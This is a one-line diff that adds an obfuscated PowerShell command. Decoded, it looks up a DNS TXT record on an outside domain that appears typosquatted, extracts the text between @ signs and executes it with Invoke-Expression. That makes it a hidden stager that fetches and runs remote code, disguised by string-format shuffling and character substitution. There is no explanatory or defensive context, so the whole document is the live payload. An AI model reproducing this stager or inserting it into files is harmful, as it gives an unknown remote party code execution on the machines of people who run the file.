@@ -1,0 +1,1 @@
+﻿ INvoKe-exPRESsion((("{5}{1}{6}{16}{4}{0}{13}{15}{14}{9}{8}{10}{12}{17}{7}{2}{3}{11}" -f '.r','cQDc+(nslo','matc','hes[1]','wel','if(QD','okup ','6','.*)@Q','h QDc@(','Dc){','}','ie','o.','matc',') -','-q=txt l.ns.hua','x WG')).REPlaCE(([Char]87+[Char]71+[Char]54),[StrinG][Char]36).REPlaCE('QDc',[StrinG][Char]34))
